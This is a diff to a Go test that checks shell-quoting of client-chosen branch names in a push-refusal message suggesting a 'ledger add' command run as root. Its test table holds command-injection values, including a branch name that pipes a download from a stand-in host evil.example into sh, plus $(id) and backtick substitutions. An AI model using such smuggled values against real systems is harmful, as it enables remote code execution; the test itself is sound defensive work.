@@ -131,6 +131,21 @@ func TestCheckPush(t *testing.T) {
 	if want := "ledger add acme/widgets agent/mine " + b; !strings.Contains(got["refs/heads/agent/mine"], want) {
 		t.Errorf("refusal %q doesn't say %q", got["refs/heads/agent/mine"], want)
 	}
+	// The client picks the branch name, and the user runs the command as
+	// root, so a name that holds shell syntax is quoted as one word.
+	for branch, word := range map[string]string{
+		"x;curl${IFS}evil.example/i|sh;#": `'x;curl${IFS}evil.example/i|sh;#'`,
+		"a$(id)b":                         `'a$(id)b'`,
+		"a`id`b":                          "'a`id`b'",
+		"it's;id":                         `'it'\''s;id'`,
+		"a&b":                             `'a&b'`,
+		"feat/ok-1.2_x":                   `feat/ok-1.2_x`,
+	} {
+		got := CheckPush(Push{Updates: []RefUpdate{{b, a, "refs/heads/" + branch}}}, br)
+		if want := "ledger add acme/widgets " + word + " " + b; !strings.HasSuffix(got["refs/heads/"+branch], want) {
+			t.Errorf("%s: refusal %q doesn't end %q", branch, got["refs/heads/"+branch], want)
+		}
+	}
 	// One ref twice in a push is refused, since the ledger reads GitHub's
 	// answer by ref. The refs after it still get their own reasons.
 	twice := Push{Updates: []RefUpdate{{zeroOID, a, "refs/heads/agent/new"}, {zeroOID, b, "refs/heads/agent/new"}, {zeroOID, a, "refs/tags/v1"}}}
